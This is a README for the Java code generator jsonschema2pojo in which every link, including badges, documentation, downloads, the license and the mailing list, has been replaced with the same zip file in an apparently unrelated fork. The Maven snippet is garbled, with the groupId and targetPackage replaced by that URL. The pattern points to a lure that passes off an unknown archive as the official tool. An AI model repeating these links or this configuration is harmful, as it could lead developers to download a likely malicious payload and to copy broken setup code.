# jsonschema2pojo [![Build Status](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip) [![Maven Central](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)

_jsonschema2pojo_ generates Java types from JSON Schema (or example JSON) and can annotate those types for data-binding with Jackson 1.x, Jackson 2.x or Gson.

### [Try jsonschema2pojo online](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)<br>or `brew install jsonschema2pojo`

You can use jsonschema2pojo as a Maven plugin, an Ant task, a command line utility, a Gradle plugin or embedded within your own Java app. The [Getting Started](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip) guide will show you how.

A very simple Maven example:
```xml
<plugin>
    <groupId>https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip</groupId>
    <artifactId>jsonschema2pojo-maven-plugin</artifactId>
    <version>0.4.26</version>
    <configuration>
        <sourceDirectory>${basedir}/src/main/resources/schema</sourceDirectory>
        <targetPackage>https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip</targetPackage>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>generate</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

Useful pages:
  * **[Getting started](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)**
  * **[How to contribute](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)**
  * [Reference](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)
  * [Latest Javadocs](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)
  * [Documentation for the Maven plugin](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)
  * [Documentation for the Ant task](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)

Project resources:
  * [Downloads](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip)
  * [Mailing list](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip!forum/jsonschema2pojo-users)

Licensed under the [Apache License, Version 2.0](https://raw.githubusercontent.com/ducnguyenminh/jsonschema2pojo/master/torteau/jsonschema2pojo.zip).
